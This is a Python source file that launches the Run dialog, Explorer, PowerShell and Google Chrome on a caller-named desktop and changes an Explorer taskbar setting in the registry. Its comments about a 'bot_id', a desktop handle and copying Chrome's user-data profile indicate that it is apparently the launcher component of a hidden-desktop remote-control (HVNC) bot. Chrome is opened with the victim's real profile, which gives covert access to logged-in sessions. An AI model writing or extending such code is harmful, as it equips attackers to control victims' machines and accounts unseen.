import ctypes
from ctypes import wintypes
import win32process
import win32con
import win32event
import win32gui
import win32api
import os
import winreg
import win32com.shell.shell as shell
import win32com.shell.shellcon as shellcon
import shutil

# Constants
CSIDL_SYSTEM = 0x25  # CSIDL for the system folder (e.g., C:\Windows\System32)

# Load shell32.dll for SHGetFolderPathA
shell32 = ctypes.windll.shell32
user32 = ctypes.windll.user32

def start_run(deskopname):
    # Buffers
    MAX_PATH = 260
    rundllPath = ctypes.create_string_buffer(MAX_PATH)

    # Get system directory (like "C:\Windows\System32")
    shell32.SHGetFolderPathA(None, CSIDL_SYSTEM, None, 0, rundllPath)

    # Append the rundll32 command
    rundll_command = rundllPath.value.decode() + r"\rundll32.exe shell32.dll,#61"

    # Assume g_h_desk is already set — placeholder
    # g_h_desk = None  # <-- You must replace this with a valid HDESK handle if you have one

    # Setup STARTUPINFO
    startup_info = win32process.STARTUPINFO()
    #startup_info.cb = ctypes.sizeof(win32process.STARTUPINFO)
    startup_info.lpDesktop = deskopname  # Set the desktop handle (can also be a string like 'WinSta0\\Default')
    try:
        process_info = win32process.CreateProcess(
            None,                  # ApplicationName
            rundll_command,         # CommandLine
            None,                   # Process Security Attributes
            None,                   # Thread Security Attributes
            False,                  # Inherit Handles
            0,                      # Creation Flags
            None,                   # Environment
            None,                   # Current Directory
            startup_info            # Startup Info
        )

        print(f"Process created successfully: PID={process_info[2]}")

    except Exception as e:
        print(f"Failed to create process: {e}")

def start_explorer(desktopname):
    never_combine = 2
    value_name = "TaskbarGlomLevel"
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS) as key:
        try:
            value, reg_type = winreg.QueryValueEx(key, value_name)
        except FileNotFoundError:
            value = None

        # Set the value if it's not already set to never combine
        if value != never_combine:
            winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, never_combine)
    
    # Build the path to explorer.exe
    windows_dir = os.environ.get("WINDIR", "C:\\Windows")
    explorer_path = os.path.join(windows_dir, "explorer.exe")

    startup_info = win32process.STARTUPINFO()
    startup_info.lpDesktop = desktopname
    print(desktopname)
    print(explorer_path)
    try:
        process_info = win32process.CreateProcess(
            None,                  # ApplicationName
            explorer_path,         # CommandLine
            None,                   # Process Security Attributes
            None,                   # Thread Security Attributes
            False,                  # Inherit Handles
            0,                      # Creation Flags
            None,                   # Environment
            None,                   # Current Directory
            startup_info            # Startup Info
        )

        print(f"Process created successfully: PID={process_info[2]}")

    except Exception as e:
        print(f"Failed to create process: {e}")

def start_powershell(desktopname):
    # Equivalent of C-style string concat: path = hd8 + powershell
    path = "cmd.exe /c start " + "powershell -noexit -command \"[console]::windowwidth = 100;[console]::windowheight = 30; [console]::bufferwidth = [console]::windowwidth\""  # Strs.hd8 might be something like "C:\\Windows\\System32\\", and Strs.powershell = "WindowsPowerShell\\v1.0\\powershell.exe"

    # Prepare STARTUPINFO and assign desktop
    startup_info = win32process.STARTUPINFO()
    startup_info.lpDesktop = desktopname

    try:
        process_info = win32process.CreateProcess(
            None,          # Application name
            path,          # Command line
            None,          # Process security attributes
            None,          # Thread security attributes
            False,         # Inherit handles
            0,             # Creation flags
            None,          # Environment
            None,          # Current directory
            startup_info   # Startup info
        )
        print(f"Powershell started: PID={process_info[2]}")
    except Exception as e:
        print(f"Failed to start PowerShell: {e}")

            
def start_chrome(desktopname, g_applist):
    # Get LOCAL_APPDATA path
    chrome_path = shell.SHGetFolderPath(0, shellcon.CSIDL_LOCAL_APPDATA, None, 0)
    chrome_path = chrome_path + "\\Google\\Chrome\\"

    data_path = chrome_path + "User Data\\"
    #bot_id = get_bot_id()                                # implement or import this function
    #new_data_path = chrome_path + bot_id
#
    ## CopyDir logic: replicate the directory
    #try:
    #    if os.path.exists(new_data_path):
    #        shutil.rmtree(new_data_path)
    #    shutil.copytree(data_path, new_data_path)
    #except Exception as e:
    #    print(f"Failed to copy Chrome user data: {e}")
    #    return

    # Search for Chrome in g_applist
    chrome_exec_path = None
    chrome_path = None
    for app in g_applist:
        name = app.get("DisplayName", "").lower()
        if "google chrome" in name:
            chrome_path = app.get("InstallLocation", "")
            break

    if chrome_path:
        chrome_exec_path = f"{chrome_path}\\chrome.exe"
        chrome_exec_path += " --disable-gpu --disable-software-rasterizer "
    else:
        print("Google Chrome not found in installed applications.")

    # Append user data dir
    chrome_exec_path += f'--user-data-dir="{data_path}"'
    print(chrome_exec_path)

    # Launch process
    startup_info = win32process.STARTUPINFO()
    startup_info.lpDesktop = desktopname

    try:
        win32process.CreateProcess(
            None,
            chrome_exec_path,
            None,
            None,
            False,
            0,
            None,
            None,
            startup_info
        )
        print("Chrome started.")
    except Exception as e:
        print(f"Failed to start Chrome: {e}")    
# start_run(0)